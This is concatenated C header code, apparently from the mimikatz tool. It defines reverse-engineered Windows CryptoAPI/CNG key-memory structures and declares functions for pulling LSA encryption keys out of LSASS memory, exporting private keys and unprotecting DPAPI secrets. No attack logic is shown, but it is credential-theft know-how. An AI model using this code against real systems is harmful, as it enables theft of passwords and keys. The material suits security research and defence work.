typedef struct _KIWI_BCRYPT_ASYM_KEY_10_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits;
	DWORD unk0;
	DWORD32 unk1; // --> 'MSRA'
	DWORD32 data;
} KIWI_BCRYPT_ASYM_KEY_10_32, *PKIWI_BCRYPT_ASYM_KEY_10_32;

typedef struct _KIWI_BCRYPT_ASYM_KEY_Bignum_81_32 {
	DWORD32 nbBlock; // ??? 16 ( 128 / 8)
	DWORD32 unk0; // 8
	DWORD32 unk1; // 32
	DWORD bits; // 1024
	DWORD unk2; // 1
	DWORD32 unkLock0; // ...
	DWORD32 unkLock1; // 0
	DWORD32 unkLock2; // ...
	DWORD32 Prime;
	DWORD32 unkData0;
	DWORD32 unkData1;
	DWORD32 unkData2;
	DWORD32 unk3; // 0
	DWORD32 Bcrypt_modmul;
	DWORD32 unk4; // 0
	DWORD32 Bcrypt_modexp; // only 8.1
	DWORD32 unk5; // 0
} KIWI_BCRYPT_ASYM_KEY_Bignum_81_32, *PKIWI_BCRYPT_ASYM_KEY_Bignum_81_32;

typedef struct _KIWI_BCRYPT_ASYM_KEY_81_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits0;
	DWORD unk0; // 1 + align
	DWORD32 unk1; // --> 'MSRA'
	DWORD unk2; // 1
	DWORD bits1;
	DWORD nbModulus; // ??? 32 ( 256 / 8)
	DWORD nbExp1 ; // ??? 16 ( 128 / 8)
	DWORD nbExp2; // ??? 16 ( 128 / 8)
	DWORD Tag; // 'KASR' (RSA Key)
	DWORD Size; // 0x308 + align
	DWORD32 PublicExponent;
	DWORD32 _PublicExponent;
	DWORD32 Modulus;
	DWORD32 Exponent1;
	DWORD32 Exponent2;
	DWORD32 Coefficient;
	DWORD32 unk3;
	KIWI_BCRYPT_ASYM_KEY_Bignum_81_32 bnPrime1;
	KIWI_BCRYPT_ASYM_KEY_Bignum_81_32 bnPrime2;
} KIWI_BCRYPT_ASYM_KEY_81_32, *PKIWI_BCRYPT_ASYM_KEY_81_32;

typedef struct _KIWI_BCRYPT_ASYM_KEY_Bignum_6_32 {
	DWORD32 nbBlock; // ??? 16 ( 128 / 8)
	DWORD32 unk0; // 8
	DWORD32 unk1; // 32
	DWORD bits; // 1024
	DWORD unk2; // 1
	DWORD32 unkLock0; // ...
	DWORD32 unkLock1; // 0
	DWORD32 unkLock2; // ...
	DWORD32 Prime;
	DWORD32 unkData0;
	DWORD32 unkData1;
	DWORD32 unkData2;
	DWORD32 unk3; // 0
	DWORD32 Bcrypt_modmul;
	DWORD32 unk4; // 0
	//DWORD32 unk5; // 0
} KIWI_BCRYPT_ASYM_KEY_Bignum_6_32, *PKIWI_BCRYPT_ASYM_KEY_Bignum_6_32;

typedef struct _KIWI_BCRYPT_ASYM_KEY_6_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits0;
	DWORD unk0; // 1 + align
	DWORD32 unk1; // --> 'MSRA'
	DWORD unk2; // 1
	DWORD bits1;
	DWORD nbModulus; // ??? 32 ( 256 / 8)
	DWORD nbExp1 ; // ??? 16 ( 128 / 8)
	DWORD nbExp2; // ??? 16 ( 128 / 8)
	DWORD Tag; // 'KASR' (RSA Key)
	DWORD Size; // 0x308 + align
	DWORD32 PublicExponent;
	DWORD32 _PublicExponent;
	DWORD32 Modulus;
	DWORD32 Exponent1;
	DWORD32 Exponent2;
	DWORD32 Coefficient;
	DWORD32 unk3;
	KIWI_BCRYPT_ASYM_KEY_Bignum_6_32 bnPrime1;
	KIWI_BCRYPT_ASYM_KEY_Bignum_6_32 bnPrime2;
} KIWI_BCRYPT_ASYM_KEY_6_32, *PKIWI_BCRYPT_ASYM_KEY_6_32;

typedef struct _KIWI_BCRYPT_SYM_KEY_81_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD unk0; // same as BL ?
	DWORD dwEffectiveKeyLen;
	DWORD unk1; // bigalign?
	DWORD32 unk2; //--> 'MSRA'
	BYTE IV[16];
	DWORD dwData;
	BYTE Data[32];
	// ...
} KIWI_BCRYPT_SYM_KEY_81_32, *PKIWI_BCRYPT_SYM_KEY_81_32;

typedef struct _KIWI_BCRYPT_SYM_KEY_80_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD unk0; // same as BL ?
	DWORD dwEffectiveKeyLen;
	DWORD32 unk1; //--> 'MSRA'
	DWORD dwData;
	BYTE Data[64];
	BYTE IV[16];
	// ...
} KIWI_BCRYPT_SYM_KEY_80_32, *PKIWI_BCRYPT_SYM_KEY_80_32;

typedef struct _KIWI_BCRYPT_SYM_KEY_6_32 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD dwEffectiveKeyLen;
	DWORD dwData;
	BYTE Data[64];
	// ...
	BYTE IV[ANYSIZE_ARRAY /* dwBlockLen */];
} KIWI_BCRYPT_SYM_KEY_6_32, *PKIWI_BCRYPT_SYM_KEY_6_32;

typedef struct _KIWI_BCRYPT_HANDLE_KEY32 {
	DWORD size;
	DWORD tag;	// 'UUUR'
	DWORD32 hAlgorithm;
	DWORD32 key;
	DWORD32 unk0; // ?
} KIWI_BCRYPT_HANDLE_KEY32, *PKIWI_BCRYPT_HANDLE_KEY32;

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64

typedef struct _KIWI_PRIV_STRUCT_64 {
	DWORD64 strangeStruct;
	//DWORD unk0; // 0	// inconsitent between versions
	//DWORD unk1; // 0x20002
	//DWORD unk2; // 0x80119
	//DWORD64 rawKey;
	//DWORD unk3; // 4
	//DWORD unk4; // 0x2000e
	//DWORD unk5; // 0x8011b
} KIWI_PRIV_STRUCT_64, *PKIWI_PRIV_STRUCT_64;

typedef struct _KIWI_RAWKEY64 {
	DWORD64 obfUnk0; // 0E380D2CC
	ALG_ID Algid;
	DWORD Flags; // ? 1
	DWORD dwData; // size (0x10) ?
	// align on x64
	DWORD64 Data;
	DWORD unk0; // ? 1
	DWORD unk1;
	DWORD64 unk2; //
	DWORD unk3;
	BYTE IV[32];
	DWORD unk4;
	DWORD dwSalt;
	BYTE Salt[24];
	DWORD unk5; // ? 1
	DWORD dwMode;
	DWORD dwModeBits;
	DWORD dwPermissions;
	DWORD dwEffectiveKeyLen;
	DWORD64 OaepParamsLen;
	DWORD dwOaepParamsLen;
	DWORD dwBlockLen;
} KIWI_RAWKEY64, *PKIWI_RAWKEY64;

typedef struct _KIWI_UNK_INT_KEY64 {
	DWORD64 /*PKIWI_RAWKEY */KiwiRawKey;
	DWORD unk0; // 2
} KIWI_UNK_INT_KEY64, *PKIWI_UNK_INT_KEY64;

typedef struct _KIWI_CRYPTKEY64 {
	DWORD64 CPGenKey;
	DWORD64 CPDeriveKey;
	DWORD64 CPDestroyKey;
	DWORD64 CPSetKeyParam;
	DWORD64 CPGetKeyParam;
	DWORD64 CPExportKey;
	DWORD64 CPImportKey;
	DWORD64 CPEncrypt;
	DWORD64 CPDecrypt;
	DWORD64 CPDuplicateKey;
	DWORD64 /*PKIWI_CRYPTPROV */KiwiProv;
	DWORD64 /*PKIWI_UNK_INT_KEY */obfKiwiIntKey;
} KIWI_CRYPTKEY64, *PKIWI_CRYPTKEY64;


typedef struct _KIWI_BCRYPT_BIGNUM_Int64 {
	KIWI_BCRYPT_BIGNUM_Header Header;
	DWORD unk[4];
	BYTE data[ANYSIZE_ARRAY];
} KIWI_BCRYPT_BIGNUM_Int64, *PKIWI_BCRYPT_BIGNUM_Int64;

typedef struct _KIWI_BCRYPT_BIGNUM_ComplexType64 {
	KIWI_BCRYPT_BIGNUM_Header Header;
	DWORD unkLenFlags0; // 0x80
	DWORD unk0; // 0
	DWORD align0[2]; // tocheck ?
	BYTE unkArray0[8]; // 8Bh,9Ch,87h,0B9h,12h,68h,84h,7Fh vary
	DWORD64 unkDataAfter;
	DWORD unk1; // 0
	DWORD unk2; // 0
	DWORD unk3; // 0
	DWORD align1; // tocheck ?
	KIWI_BCRYPT_BIGNUM_Header bn;
} KIWI_BCRYPT_BIGNUM_ComplexType64, *PKIWI_BCRYPT_BIGNUM_ComplexType64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_DATA_10_64 {
	DWORD size; // 3552
	DWORD unk0; // 1
	DWORD len0; // 2048
	DWORD len1; // 2048
	DWORD unk1; // 0x10
	DWORD unk2; // 1
	DWORD unk3; // 0x11
	DWORD unk4; // 1
	DWORD unk5; // 2
	DWORD len2; // 1024
	DWORD len3; // 1024
	DWORD unk6;	// 8
	DWORD unk7;	// 8
	DWORD unk8;	// 8
	DWORD64 Prime1; // C
	DWORD64 Prime2; // C
	DWORD64 unkArray0;
	DWORD64 unkArray1;
	DWORD64 PublicExponent;
	DWORD64 PrivateExponent;
	DWORD64 Exponent1;
	DWORD64 Exponent2;
	DWORD64 Modulus; // C
	DWORD64 _Prime1; // C
	DWORD64 _Prime2; // C
	DWORD64 _unkArray0;
	DWORD64 _unkArray1;
	DWORD64 _PublicExponent;
	DWORD64 _PrivateExponent;
	DWORD64 _Exponent1;
	DWORD64 _Exponent2;
	DWORD64 unk9; // 0 maybe align with data just after...
} KIWI_BCRYPT_ASYM_KEY_DATA_10_64, *PKIWI_BCRYPT_ASYM_KEY_DATA_10_64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_10_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits;
	DWORD unk0;
	DWORD64 unk1; // --> 'MSRA'
	DWORD64 data;
} KIWI_BCRYPT_ASYM_KEY_10_64, *PKIWI_BCRYPT_ASYM_KEY_10_64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_Bignum_81_64 {
	DWORD64 nbBlock; // ??? 16 ( 128 / 8)
	DWORD64 unk0; // 8
	DWORD64 unk1; // 32
	DWORD bits; // 1024
	DWORD unk2; // 1
	DWORD64 unkLock0; // ...
	DWORD64 unkLock1; // 0
	DWORD64 unkLock2; // ...
	DWORD64 Prime;
	DWORD64 unkData0;
	DWORD64 unkData1;
	DWORD64 unkData2;
	DWORD64 unk3; // 0
	DWORD64 Bcrypt_modmul;
	DWORD64 unk4; // 0
	DWORD64 Bcrypt_modexp; // only 8.1
	DWORD64 unk5; // 0
} KIWI_BCRYPT_ASYM_KEY_Bignum_81_64, *PKIWI_BCRYPT_ASYM_KEY_Bignum_81_64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_81_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits0;
	DWORD unk0; // 1 + align
	DWORD64 unk1; // --> 'MSRA'
	DWORD unk2; // 1
	DWORD bits1;
	DWORD nbModulus; // ??? 32 ( 256 / 8)
	DWORD nbExp1 ; // ??? 16 ( 128 / 8)
	DWORD nbExp2; // ??? 16 ( 128 / 8)
	DWORD Tag; // 'KASR' (RSA Key)
	DWORD Size; // 0x308 + align
	DWORD64 PublicExponent;
	DWORD64 _PublicExponent;
	DWORD64 Modulus;
	DWORD64 Exponent1;
	DWORD64 Exponent2;
	DWORD64 Coefficient;
	DWORD64 unk3;
	KIWI_BCRYPT_ASYM_KEY_Bignum_81_64 bnPrime1;
	KIWI_BCRYPT_ASYM_KEY_Bignum_81_64 bnPrime2;
} KIWI_BCRYPT_ASYM_KEY_81_64, *PKIWI_BCRYPT_ASYM_KEY_81_64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_Bignum_6_64 {
	DWORD64 nbBlock; // ??? 16 ( 128 / 8)
	DWORD64 unk0; // 8
	DWORD64 unk1; // 32
	DWORD bits; // 1024
	DWORD unk2; // 1
	DWORD64 unkLock0; // ...
	DWORD64 unkLock1; // 0
	DWORD64 unkLock2; // ...
	DWORD64 Prime;
	DWORD64 unkData0;
	DWORD64 unkData1;
	DWORD64 unkData2;
	DWORD64 unk3; // 0
	DWORD64 Bcrypt_modmul;
	DWORD64 unk4; // 0
	//DWORD64 unk5; // 0
} KIWI_BCRYPT_ASYM_KEY_Bignum_6_64, *PKIWI_BCRYPT_ASYM_KEY_Bignum_6_64;

typedef struct _KIWI_BCRYPT_ASYM_KEY_6_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD bits0;
	DWORD unk0; // 1 + align
	DWORD64 unk1; // --> 'MSRA'
	DWORD unk2; // 1
	DWORD bits1;
	DWORD nbModulus; // ??? 32 ( 256 / 8)
	DWORD nbExp1 ; // ??? 16 ( 128 / 8)
	DWORD nbExp2; // ??? 16 ( 128 / 8)
	DWORD Tag; // 'KASR' (RSA Key)
	DWORD Size; // 0x308 + align
	DWORD64 PublicExponent;
	DWORD64 _PublicExponent;
	DWORD64 Modulus;
	DWORD64 Exponent1;
	DWORD64 Exponent2;
	DWORD64 Coefficient;
	DWORD64 unk3;
	KIWI_BCRYPT_ASYM_KEY_Bignum_6_64 bnPrime1;
	KIWI_BCRYPT_ASYM_KEY_Bignum_6_64 bnPrime2;
} KIWI_BCRYPT_ASYM_KEY_6_64, *PKIWI_BCRYPT_ASYM_KEY_6_64;

typedef struct _KIWI_BCRYPT_SYM_KEY_81_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD unk0; // same as BL ?
	DWORD dwEffectiveKeyLen;
	DWORD unk1; // bigalign?
	DWORD64 unk2; //--> 'MSRA'
	BYTE IV[16];
	DWORD dwData;
	BYTE Data[32];
	// ...
} KIWI_BCRYPT_SYM_KEY_81_64, *PKIWI_BCRYPT_SYM_KEY_81_64;

typedef struct _KIWI_BCRYPT_SYM_KEY_80_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD unk0; // same as BL ?
	DWORD dwEffectiveKeyLen;
	DWORD64 unk1; //--> 'MSRA'
	DWORD dwData;
	BYTE Data[64];
	BYTE IV[16];
	// ...
} KIWI_BCRYPT_SYM_KEY_80_64, *PKIWI_BCRYPT_SYM_KEY_80_64;

typedef struct _KIWI_BCRYPT_SYM_KEY_6_64 {
	KIWI_BCRYPT_GENERIC_KEY_HEADER Header;
	DWORD dwMode;
	DWORD dwBlockLen;
	DWORD dwEffectiveKeyLen;
	DWORD dwData;
	BYTE Data[64];
	// ...
	BYTE IV[ANYSIZE_ARRAY /* dwBlockLen */];
} KIWI_BCRYPT_SYM_KEY_6_64, *PKIWI_BCRYPT_SYM_KEY_6_64;

typedef struct _KIWI_BCRYPT_HANDLE_KEY64 {
	DWORD size;
	DWORD tag;	// 'UUUR'
	DWORD64 hAlgorithm;
	DWORD64 key;
	DWORD64 unk0; // ?
} KIWI_BCRYPT_HANDLE_KEY64, *PKIWI_BCRYPT_HANDLE_KEY64;
#endif

#define RSAENH_KEY_32	0xe35a172c
#define DSSENH_KEY_32	0xa2491d83

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
#define RSAENH_KEY_64	0xe35a172cd96214a0
#define DSSENH_KEY_64	0xa2491d83d96214a0
#endif

typedef struct _KIWI_CRYPT_SEARCH {
	PKULL_M_MEMORY_HANDLE hMemory;
	WORD Machine;
	KIWI_CRYPTKEY32 ProcessKiwiCryptKey32;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	KIWI_CRYPTKEY64 ProcessKiwiCryptKey64;
#endif
	BOOL bAllProcessKiwiCryptKey;
	DWORD myPid;
	DWORD prevPid;
	DWORD currPid;
	PCUNICODE_STRING processName;
} KIWI_CRYPT_SEARCH, *PKIWI_CRYPT_SEARCH;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../../../modules/kull_m_patch.h"
//#include "../../../modules/kull_m_crypto.h"

typedef BOOL (WINAPI * PCP_EXPORTKEY) (IN HCRYPTPROV hProv, IN HCRYPTKEY hKey, IN HCRYPTKEY hPubKey, IN DWORD dwBlobType, IN DWORD dwFlags, OUT LPBYTE pbData, IN OUT LPDWORD pcbDataLen);
PCP_EXPORTKEY K_RSA_CPExportKey, K_DSS_CPExportKey;

NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../../../modules/kull_m_string.h"
//#include "../../../modules/kull_m_crypto.h"//*_system.h"
////#include "../kuhl_m_crypto.h"

typedef struct _KIWI_KEY_INFO {
	CRYPT_KEY_PROV_INFO keyInfos;
	LPSTR pin;
	DWORD dwKeyFlags;
	WORD wKeySize;
	HCRYPTPROV hProv;
} KIWI_KEY_INFO, *PKIWI_KEY_INFO;

typedef struct _KIWI_CERT_INFO {
	LPFILETIME notbefore; // do NOT move
	LPFILETIME notafter; // do NOT move
	LPCWSTR cn;
	LPCWSTR ou;
	LPCWSTR o;
	LPCWSTR c;
	LPCWSTR sn;
	WORD ku;
	LPSTR algorithm;
	BOOL isAC;
	PCERT_EXTENSION eku;
	PCERT_EXTENSION san;
	PCERT_EXTENSION cdp;
} KIWI_CERT_INFO, *PKIWI_CERT_INFO;

typedef struct _KIWI_CRL_INFO {
	LPFILETIME thisupdate; // do NOT move
	LPFILETIME nextupdate; // do NOT move
	LPSTR algorithm;
	int crlnumber;
	// ...
} KIWI_CRL_INFO, *PKIWI_CRL_INFO;

typedef struct _KIWI_SIGNER {
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv;
	DWORD dwKeySpec;
	FILETIME NotBefore;
	FILETIME NotAfter;
	CERT_NAME_BLOB Subject;
} KIWI_SIGNER, *PKIWI_SIGNER;

PWSTR kuhl_m_crypto_pki_getCertificateName(PCERT_NAME_BLOB blob);

NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[]);
BOOL kuhl_m_crypto_c_sc_auth_quickEncode(__in LPCSTR lpszStructType, __in const void *pvStructInfo, PDATA_BLOB data);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_crypto.h"

////#include "../../../modules/kull_m_crypto.h"

NTSTATUS kuhl_m_crypto_l_sc(int argc, wchar_t * argv[]);

void kuhl_m_crypto_l_mdr(LPCWSTR szMdr, SCARDCONTEXT ctxScard, SCARDHANDLE hScard, LPCWSTR szModel, LPCBYTE pbAtr, DWORD cbAtr);
DWORD kuhl_m_crypto_l_sc_provtypefromname(LPCWSTR szProvider);
PWSTR kuhl_m_crypto_l_sc_containerFromReader(LPCWSTR reader);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../globals_sekurlsa.h"
#if !defined(_M_ARM64)
NTSTATUS kuhl_m_sekurlsa_nt5_init();
NTSTATUS kuhl_m_sekurlsa_nt5_clean();

NTSTATUS kuhl_m_sekurlsa_nt5_LsaInitializeProtectedMemory();

const PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt5_pLsaProtectMemory, kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory;

BOOL kuhl_m_sekurlsa_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp);
NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille);

VOID WINAPI kuhl_m_sekurlsa_nt5_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize);
VOID WINAPI kuhl_m_sekurlsa_nt5_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize);
NTSTATUS kuhl_m_sekurlsa_nt5_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt);

/*	All code below is very (very) inspired from Microsoft SymCrypt
	> https://github.com/Microsoft/SymCrypt
	Lots of thanks to Niels Ferguson ( https://github.com/NielsFerguson )

	Was not able to use CryptoAPI because:
	- DES-X is not supported
		- even if, DES-X main DES key is stored already scheduled, so not compatible with CryptoAPI
	- RC4 is not supported with key > 128 bits (LSA uses one of 2048 bits)

	A good example of 'do not use what I use'
*/
typedef struct _SYMCRYPT_NT5_DES_EXPANDED_KEY {
    UINT32  roundKey[16][2];
} SYMCRYPT_NT5_DES_EXPANDED_KEY, *PSYMCRYPT_NT5_DES_EXPANDED_KEY;
typedef const SYMCRYPT_NT5_DES_EXPANDED_KEY * PCSYMCRYPT_NT5_DES_EXPANDED_KEY;

typedef struct _SYMCRYPT_NT5_DESX_EXPANDED_KEY {
	BYTE inputWhitening[8];
	BYTE outputWhitening[8];
	SYMCRYPT_NT5_DES_EXPANDED_KEY desKey;
} SYMCRYPT_NT5_DESX_EXPANDED_KEY, *PSYMCRYPT_NT5_DESX_EXPANDED_KEY;
typedef const SYMCRYPT_NT5_DESX_EXPANDED_KEY * PCSYMCRYPT_NT5_DESX_EXPANDED_KEY;

typedef struct _SYMCRYPT_RC4_STATE {
    BYTE S[256];
    BYTE i;
    BYTE j;
} SYMCRYPT_RC4_STATE, *PSYMCRYPT_RC4_STATE;

#define ROL32( x, n ) _rotl( (x), (n) )
#define ROR32( x, n ) _rotr( (x), (n) )
#define F(L, R, keyptr) { \
    Ta = keyptr[0] ^ R; \
    Tb = keyptr[1] ^ R; \
    Tb = ROR32(Tb, 4); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[0] + ( Ta     & 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[1] + ( Tb     & 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[2] + ((Ta>> 8)& 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[3] + ((Tb>> 8)& 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[4] + ((Ta>>16)& 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[5] + ((Tb>>16)& 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[6] + ((Ta>>24)& 0xfc)); \
    L ^= *(UINT32 *)((PBYTE)SymCryptDesSpbox[7] + ((Tb>>24)& 0xfc)); }

VOID SymCryptDesGenCrypt2(PCSYMCRYPT_NT5_DES_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst, BOOL Encrypt);
VOID SymCryptDesxDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst);
VOID SymCryptDesxEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, LPCBYTE pbSrc, PBYTE pbDst);
VOID SymCryptDesxCbcDecrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData);
VOID SymCryptDesxCbcEncrypt2(PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData);

typedef VOID (* PCRYPT_ENCRYPT) (PCSYMCRYPT_NT5_DESX_EXPANDED_KEY pExpandedKey, PBYTE pbChainingValue, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData);

BOOL SymCryptRc4Init2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbKey, SIZE_T cbKey);
VOID SymCryptRc4Crypt2(PSYMCRYPT_RC4_STATE pState, LPCBYTE pbSrc, PBYTE pbDst, SIZE_T cbData);
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../globals_sekurlsa.h"

// generic in KULL_M_CRYPTO.H
typedef struct _KIWI_BCRYPT_KEY8 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	PVOID unk4;	// before, align in x64
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY8, *PKIWI_BCRYPT_KEY8;

typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2; 
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PKIWI_BCRYPT_KEY key;
	PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;

typedef struct _KIWI_BCRYPT_GEN_KEY {
	BCRYPT_ALG_HANDLE hProvider;
	BCRYPT_KEY_HANDLE hKey;
	PBYTE pKey;
	ULONG cbKey;
} KIWI_BCRYPT_GEN_KEY, *PKIWI_BCRYPT_GEN_KEY;

typedef NTSTATUS	(WINAPI * PBCRYPT_ENCRYPT)					(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in_opt VOID *pPaddingInfo, __inout_bcount_opt(cbIV) PUCHAR pbIV, __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG *pcbResult, __in ULONG dwFlags);

NTSTATUS kuhl_m_sekurlsa_nt6_init();
NTSTATUS kuhl_m_sekurlsa_nt6_clean();
const PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt6_pLsaProtectMemory, kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory;

NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset); // TODO:ARM64

NTSTATUS kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory();
VOID kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt);
VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize);
VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "../kuhl_m.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_dpapi.h"

//#include "kuhl_m_dpapi_oe.h"
//#include "packages/kuhl_m_dpapi_keys.h"
//#include "packages/kuhl_m_dpapi_creds.h"
//#include "packages/kuhl_m_dpapi_wlan.h"
//#include "packages/kuhl_m_dpapi_chrome.h"
//#include "packages/kuhl_m_dpapi_ssh.h"
//#include "packages/kuhl_m_dpapi_rdg.h"
//#include "packages/kuhl_m_dpapi_powershell.h"
//#include "packages/kuhl_m_dpapi_lunahsm.h"
//#include "packages/kuhl_m_dpapi_cloudap.h"
//#include "packages/kuhl_m_dpapi_sccm.h"
//#include "packages/kuhl_m_dpapi_citrix.h"


typedef struct _KUHL_M_C {
	const PKUHL_M_C_FUNC pCommand;
	const wchar_t* command;
	const wchar_t* description;
} KUHL_M_C, * PKUHL_M_C;

typedef struct _KUHL_M {
	const wchar_t* shortName;
	const wchar_t* fullName;
	const wchar_t* description;
	const unsigned short nbCommands;
	const KUHL_M_C* commands;
	const PKUHL_M_C_FUNC_INIT pInit;
	const PKUHL_M_C_FUNC_INIT pClean;
} KUHL_M, * PKUHL_M;


const KUHL_M kuhl_m_dpapi;

NTSTATUS kuhl_m_dpapi_blob(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_credhist(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_create(int argc, wchar_t * argv[]);

BOOL kuhl_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWSTR *ppszDataDescr, int argc, wchar_t * argv[], LPCVOID pOptionalEntropy, DWORD dwOptionalEntropyLen, LPVOID *pDataOut, DWORD *dwDataOutLen, LPCWSTR pText);
